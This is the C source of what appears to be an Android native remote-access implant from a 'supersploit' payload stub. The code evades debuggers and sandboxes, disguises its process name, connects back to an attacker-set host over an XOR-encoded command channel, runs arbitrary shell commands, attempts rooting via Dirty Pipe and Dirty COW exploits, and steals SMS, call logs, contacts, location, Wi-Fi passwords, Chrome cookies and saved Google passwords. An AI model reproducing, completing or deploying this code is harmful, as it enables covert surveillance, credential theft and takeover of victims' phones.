#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <jni.h>
#include <sys/utsname.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/sysinfo.h>

// --- ENVIRONMENT PINNING ---
int check_environment() {
    // 1. Anti-Debugging Check (ptrace)
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) {
        return 0; // Debugger detected
    }
    ptrace(PTRACE_DETACH, 0, 1, 0);

    // 2. Anti-Sandbox Check (Uptime)
    struct sysinfo info;
    if (sysinfo(&info) == 0) {
        if (info.uptime < 300) {
            return 0; // Likely a fresh sandbox/emulator boot
        }
    }

    return 1; // Environment appears safe
}

// --- JNI GLOBALS ---
static JavaVM* g_vm = NULL;

// --- C2 COMMUNICATION ---
int comm_sock = -1;
int has_root = 0;

typedef struct {
    int fd;
    char* key;
} c2_args_t;

typedef struct {
    char* host;
    int port;
    char* key;
} connect_args_t;

// Base64 implementation
static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

char* b64_encode(const unsigned char *data, size_t input_length, size_t *out_len) {
    *out_len = 4 * ((input_length + 2) / 3);
    char *encoded_data = malloc(*out_len + 1);
    if (encoded_data == NULL) return NULL;
    for (size_t i = 0, j = 0; i < input_length;) {
        uint32_t octet_a = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_b = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_c = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;
        encoded_data[j++] = b64_table[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = b64_table[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = b64_table[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = b64_table[(triple >> 0 * 6) & 0x3F];
    }
    for (size_t i = 0; i < (3 - input_length % 3) % 3; i++) encoded_data[*out_len - 1 - i] = '=';
    encoded_data[*out_len] = '\0';
    return encoded_data;
}

unsigned char* b64_decode(const char *data, size_t input_length, size_t *out_len) {
    if (input_length % 4 != 0) return NULL;
    *out_len = input_length / 4 * 3;
    if (data[input_length - 1] == '=') (*out_len)--;
    if (data[input_length - 2] == '=') (*out_len)--;
    unsigned char *decoded_data = malloc(*out_len + 1);
    if (decoded_data == NULL) return NULL;
    int build_table[256];
    for (int i = 0; i < 256; i++) build_table[i] = 0;
    for (int i = 0; i < 64; i++) build_table[(unsigned char)b64_table[i]] = i;
    for (size_t i = 0, j = 0; i < input_length;) {
        uint32_t sextet_a = data[i] == '=' ? 0 : build_table[(unsigned char)data[i++]];
        uint32_t sextet_b = data[i] == '=' ? 0 : build_table[(unsigned char)data[i++]];
        uint32_t sextet_c = data[i] == '=' ? 0 : build_table[(unsigned char)data[i++]];
        uint32_t sextet_d = data[i] == '=' ? 0 : build_table[(unsigned char)data[i++]];
        uint32_t triple = (sextet_a << 3 * 6) + (sextet_b << 2 * 6) + (sextet_c << 1 * 6) + (sextet_d << 0 * 6);
        if (j < *out_len) decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
        if (j < *out_len) decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
        if (j < *out_len) decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
    }
    decoded_data[*out_len] = '\0';
    return decoded_data;
}

void xor_crypt(char *data, size_t len, const char* key) {
    if (!key || strlen(key) == 0) return;
    for (size_t i = 0; i < len; i++) data[i] ^= key[i % strlen(key)];
}

int send_enc(int fd, const char* data, size_t len, const char* key) {
    char* xord_data = (char*)malloc(len);
    if (!xord_data) return -1;
    memcpy(xord_data, data, len);
    xor_crypt(xord_data, len, key);

    size_t b64_len = 0;
    char* b64_data = b64_encode((unsigned char*)xord_data, len, &b64_len);
    free(xord_data);
    if (!b64_data) return -1;

    uint32_t net_len = htonl(b64_len);
    if (send(fd, &net_len, sizeof(net_len), 0) < 0) {
        free(b64_data);
        return -1;
    }
    if (send(fd, b64_data, b64_len, 0) < 0) {
        free(b64_data);
        return -1;
    }
    free(b64_data);
    return 0;
}

char* recv_enc(int fd, const char* key) {
    uint32_t net_len;
    if (recv(fd, &net_len, sizeof(net_len), 0) <= 0) return NULL;

    size_t b64_len = ntohl(net_len);
    if (b64_len > 8192 || b64_len == 0) return NULL;

    char* b64_buffer = malloc(b64_len + 1);
    size_t total_read = 0;
    while(total_read < b64_len) {
        ssize_t bytes_read = recv(fd, b64_buffer + total_read, b64_len - total_read, 0);
        if (bytes_read <= 0) {
            free(b64_buffer);
            return NULL;
        }
        total_read += bytes_read;
    }
    b64_buffer[b64_len] = '\0';

    size_t dec_len = 0;
    unsigned char* dec_data = b64_decode(b64_buffer, b64_len, &dec_len);
    free(b64_buffer);
    if (!dec_data) return NULL;

    xor_crypt((char*)dec_data, dec_len, key);
    char* final_str = malloc(dec_len + 1);
    memcpy(final_str, dec_data, dec_len);
    final_str[dec_len] = '\0';
    free(dec_data);

    return final_str;
}

// --- ROOTKIT LOGIC ---
int check_su() {
    if (getuid() == 0) return 1;
    FILE* fp = popen("su -c id", "r");
    if (fp) {
        char id_out[256];
        if (fgets(id_out, sizeof(id_out), fp) != NULL) {
            if (strstr(id_out, "uid=0")) {
                pclose(fp);
                return 1;
            }
        }
        pclose(fp);
    }
    return 0;
}

char* auto_root() {
    if (getuid() == 0 || has_root) {
        has_root = 1;
        return strdup("[+] Process already running as root.\n");
    }

    if (check_su()) {
        has_root = 1;
        return strdup("[+] Root access granted via SU binary (Magisk/SuperUser).\n");
    }

    struct utsname buffer;
    if (uname(&buffer) != 0) return strdup("[-] Error: uname failed\n");
    
    char* release = buffer.release;
    
    if (release[0] == '5' && release[1] == '.') {
        int minor = atoi(release + 2);
        if (minor >= 8 && minor <= 16) {
            return strdup("GET_EXPLOIT exploits/android/cve_2022_0847_dirtypipe.py\n");
        }
    }
    
    if (release[0] < '4' || (release[0] == '4' && release[2] < '8')) {
        return strdup("GET_EXPLOIT exploits/android/cve_2016_5195_dirtycow.py\n");
    }
    
    if (strstr(release, "3.10") || strstr(release, "3.4") || strstr(release, "3.18")) {
        return strdup("GET_EXPLOIT exploits/android/cve_2016_5195_dirtycow.py\n");
    }
    
    char err[256];
    snprintf(err, sizeof(err), "[-] auto_root failed: No SU binary found and no viable LPE exploit for kernel %s.\n", release);
    return strdup(err);
}

void run_with_output(int fd, const char* cmd, const char* key) {
    char final_cmd[4096];
    // Always wrap in su -c if we have root and it's not already root
    if (has_root && getuid() != 0 && strncmp(cmd, "su -c", 5) != 0) {
        snprintf(final_cmd, sizeof(final_cmd), "su -c \"%s\"", cmd);
    } else {
        strncpy(final_cmd, cmd, sizeof(final_cmd));
    }

    FILE* fp = popen(final_cmd, "r");
    if (!fp) {
        send_enc(fd, "Failed to execute command\n", 26, key);
        return;
    }
    char buffer[1024];
    size_t n;
    int sent = 0;
    while ((n = fread(buffer, 1, sizeof(buffer) - 1, fp)) > 0) {
        buffer[n] = '\0';
        send_enc(fd, buffer, n, key);
        sent = 1;
    }
    if (!sent) {
        send_enc(fd, " \n", 2, key); // Ensure at least a space is sent
    }
    pclose(fp);
}

void handle_command(int fd, const char* cmd, const char* key) {
    if (strcmp(cmd, "auto_root") == 0) {
        char* res = auto_root();
        send_enc(fd, res, strlen(res), key);
        free(res);
    } else if (strncmp(cmd, "dump_sms", 8) == 0) {
        run_with_output(fd, "content query --uri content://sms", key);
    } else if (strncmp(cmd, "dump_calls", 10) == 0) {
        run_with_output(fd, "content query --uri content://call_log/calls", key);
    } else if (strncmp(cmd, "dump_contacts", 13) == 0) {
        run_with_output(fd, "content query --uri content://contacts/phones", key);
    } else if (strncmp(cmd, "dump_calendar", 13) == 0) {
        run_with_output(fd, "content query --uri content://com.android.calendar/events", key);
    } else if (strncmp(cmd, "get_accounts", 12) == 0) {
        run_with_output(fd, "dumpsys account", key);
    } else if (strncmp(cmd, "list_apps", 9) == 0) {
        run_with_output(fd, "pm list packages -f", key);
    } else if (strncmp(cmd, "get_location", 12) == 0) {
        // More robust location query
        run_with_output(fd, "dumpsys location | grep -E \"last location|Last Known Locations:\" -A 10", key);
    } else if (strncmp(cmd, "dump_wifi", 9) == 0) {
        run_with_output(fd, "cat /data/misc/wifi/WifiConfigStore.xml /data/misc/wifi/wpa_supplicant.conf /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml 2>/dev/null", key);
    } else if (strncmp(cmd, "dump_chrome", 11) == 0) {
        run_with_output(fd, "cat \"/data/data/com.android.chrome/app_chrome/Default/Cookies\" \"/data/data/com.android.chrome/app_chrome/Default/Login Data\" 2>/dev/null", key);
    } else if (strncmp(cmd, "dump_google_passwords", 21) == 0) {
        run_with_output(fd, "cat /data/data/com.google.android.gms/databases/autofill.db /data/data/com.google.android.gms/databases/credential_manager.db /data/data/com.google.android.gms/databases/password_store.db /data/system_ce/0/accounts_ce.db 2>/dev/null", key);
    } else if (strncmp(cmd, "find_cookies", 12) == 0) {
        run_with_output(fd, "find /data/data/ -name \"Cookies\" -o -name \"*cookies.db*\" 2>/dev/null", key);
    } else if (strncmp(cmd, "find_passwords", 14) == 0) {
        run_with_output(fd, "find /data/data/ -name \"Login Data\" -o -name \"*password*\" -o -name \"*credential*\" 2>/dev/null", key);
    } else if (strncmp(cmd, "cd ", 3) == 0) {
        if (chdir(cmd + 3) == 0) send_enc(fd, "\n", 1, key);
        else send_enc(fd, "cd failed", 9, key);
    } else if (strcmp(cmd, "pwd") == 0) {
        char cwd[1024];
        if (getcwd(cwd, sizeof(cwd)) != NULL) send_enc(fd, cwd, strlen(cwd), key);
        else send_enc(fd, "pwd failed", 10, key);
    } else {
        run_with_output(fd, cmd, key);
    }
}

void* c2_loop(void* args) {
    if (!check_environment()) return NULL;
    prctl(PR_SET_NAME, "sys_watchdog", 0, 0, 0);
    c2_args_t* c2_args = (c2_args_t*)args;
    int fd = c2_args->fd;
    char* key = c2_args->key;

    // Auto-detect root on session start
    has_root = check_su();

    char banner[256];
    if (has_root) snprintf(banner, sizeof(banner), "Native C Session Active (ROOT: %s)", (getuid() == 0 ? "SYSTEM" : "SU"));
    else snprintf(banner, sizeof(banner), "Native C Session Active (User: %d)", getuid());
    
    send_enc(fd, banner, strlen(banner), key);

    while (1) {
        char* cmd = recv_enc(fd, key);
        if (!cmd) break;
        handle_command(fd, cmd, key);
        free(cmd);
    }
    close(fd);
    free(key);
    free(c2_args);
    return NULL;
}

void* connect_thread(void* args) {
    if (!check_environment()) return NULL;
    prctl(PR_SET_NAME, "sys_watchdog", 0, 0, 0);
    connect_args_t* conn_args = (connect_args_t*)args;
    
    while(1) {
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in serv_addr;
        memset(&serv_addr, 0, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(conn_args->port);
        inet_pton(AF_INET, conn_args->host, &serv_addr.sin_addr);

        if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) == 0) {
            c2_args_t* c2_args = malloc(sizeof(c2_args_t));
            c2_args->fd = sockfd;
            c2_args->key = strdup(conn_args->key);
            c2_loop(c2_args);
        }
        close(sockfd);
        sleep(10); 
    }
    
    free(conn_args->host);
    free(conn_args->key);
    free(conn_args);
    return NULL;
}

JNIEXPORT void JNICALL Java_org_supersploit_stub_PayloadService_startNativeC2(JNIEnv* env, jobject thiz, jint fd) {
    jclass context_class = (*env)->FindClass(env, "android/content/Context");
    jmethodID get_resources_mid = (*env)->GetMethodID(env, context_class, "getResources", "()Landroid/content/res/Resources;");
    jobject resources_obj = (*env)->CallObjectMethod(env, thiz, get_resources_mid);
    jclass resources_class = (*env)->GetObjectClass(env, resources_obj);
    jmethodID get_identifier_mid = (*env)->GetMethodID(env, resources_class, "getIdentifier", "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I");
    jstring key_name = (*env)->NewStringUTF(env, "xor_key");
    jstring type_name = (*env)->NewStringUTF(env, "string");
    jstring package_name = (*env)->NewStringUTF(env, "org.supersploit.stub");
    jint key_id = (*env)->CallIntMethod(env, resources_obj, get_identifier_mid, key_name, type_name, package_name);
    jmethodID get_string_mid = (*env)->GetMethodID(env, resources_class, "getString", "(I)Ljava/lang/String;");
    jstring xor_key_jstring = (jstring)(*env)->CallObjectMethod(env, resources_obj, get_string_mid, key_id);
    const char* xor_key_chars = (*env)->GetStringUTFChars(env, xor_key_jstring, 0);

    c2_args_t* args = malloc(sizeof(c2_args_t));
    args->fd = fd;
    args->key = strdup(xor_key_chars);
    (*env)->ReleaseStringUTFChars(env, xor_key_jstring, xor_key_chars);

    pthread_t thread;
    pthread_create(&thread, NULL, c2_loop, args);
    pthread_detach(thread);
}

JNIEXPORT jstring JNICALL Java_org_supersploit_stub_PayloadService_executeNative(JNIEnv* env, jobject thiz, jstring cmd_jstring) {
    const char* cmd = (*env)->GetStringUTFChars(env, cmd_jstring, 0);
    FILE* fp = popen(cmd, "r");
    if (!fp) {
        (*env)->ReleaseStringUTFChars(env, cmd_jstring, cmd);
        return (*env)->NewStringUTF(env, "Failed to execute");
    }
    char* output = malloc(1);
    output[0] = '\0';
    size_t total_len = 0;
    char buffer[1024];
    while (fgets(buffer, sizeof(buffer), fp) != NULL) {
        size_t len = strlen(buffer);
        char* new_output = realloc(output, total_len + len + 1);
        if (!new_output) break;
        output = new_output;
        strcpy(output + total_len, buffer);
        total_len += len;
    }
    pclose(fp);
    (*env)->ReleaseStringUTFChars(env, cmd_jstring, cmd);
    jstring result = (*env)->NewStringUTF(env, output);
    free(output);
    return result;
}

JNIEXPORT void JNICALL Java_org_supersploit_stub_PayloadService_start(JNIEnv* env, jobject thiz, jobject context) {
    jclass context_class = (*env)->GetObjectClass(env, context);
    jmethodID get_resources_mid = (*env)->GetMethodID(env, context_class, "getResources", "()Landroid/content/res/Resources;");
    jobject resources_obj = (*env)->CallObjectMethod(env, context, get_resources_mid);
    jclass resources_class = (*env)->GetObjectClass(env, resources_obj);
    jmethodID get_identifier_mid = (*env)->GetMethodID(env, resources_class, "getIdentifier", "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I");
    jstring type_name = (*env)->NewStringUTF(env, "string");
    jstring package_name = (*env)->NewStringUTF(env, "org.supersploit.stub");

    jstring lhost_name = (*env)->NewStringUTF(env, "lhost");
    jint lhost_id = (*env)->CallIntMethod(env, resources_obj, get_identifier_mid, lhost_name, type_name, package_name);
    jmethodID get_string_mid = (*env)->GetMethodID(env, resources_class, "getString", "(I)Ljava/lang/String;");
    jstring lhost_jstring = (jstring)(*env)->CallObjectMethod(env, resources_obj, get_string_mid, lhost_id);
    const char* lhost_chars = (*env)->GetStringUTFChars(env, lhost_jstring, 0);

    jstring lport_name = (*env)->NewStringUTF(env, "lport");
    jint lport_id = (*env)->CallIntMethod(env, resources_obj, get_identifier_mid, lport_name, type_name, package_name);
    jstring lport_jstring = (jstring)(*env)->CallObjectMethod(env, resources_obj, get_string_mid, lport_id);
    const char* lport_chars = (*env)->GetStringUTFChars(env, lport_jstring, 0);
    int port = atoi(lport_chars);

    jstring xor_key_name = (*env)->NewStringUTF(env, "xor_key");
    jint xor_key_id = (*env)->CallIntMethod(env, resources_obj, get_identifier_mid, xor_key_name, type_name, package_name);
    jstring xor_key_jstring = (jstring)(*env)->CallObjectMethod(env, resources_obj, get_string_mid, xor_key_id);
    const char* xor_key_chars = (*env)->GetStringUTFChars(env, xor_key_jstring, 0);

    connect_args_t* args = malloc(sizeof(connect_args_t));
    args->host = strdup(lhost_chars);
    args->port = port;
    args->key = strdup(xor_key_chars);

    (*env)->ReleaseStringUTFChars(env, lhost_jstring, lhost_chars);
    (*env)->ReleaseStringUTFChars(env, lport_jstring, lport_chars);
    (*env)->ReleaseStringUTFChars(env, xor_key_jstring, xor_key_chars);

    pthread_t thread;
    pthread_create(&thread, NULL, connect_thread, args);
    pthread_detach(thread);
}
